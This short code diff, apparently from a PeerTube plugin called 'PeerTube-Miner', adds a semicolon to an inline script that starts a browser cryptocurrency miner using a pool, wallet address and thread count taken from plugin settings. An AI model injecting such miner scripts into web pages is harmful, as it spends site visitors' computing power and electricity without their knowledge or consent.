@@ -31,7 +31,7 @@ peertubeHelpers.getSettings().then(
         inlineScript+= "var workerId = 'PeerTube-Miner';\n"
         inlineScript+= "var threads = '"+s['threads']+"';\n"
         inlineScript+= "var password = '"+s['password']+"';\n"
-        inlineScript+= "startMining(pool, walletAddress, workerId, threads, password)\n"
+        inlineScript+= "startMining(pool, walletAddress, workerId, threads, password);\n"
         inlineScript+= "throttleMiner = 20;\n"
 
         document.body.appendChild(inlineScript)
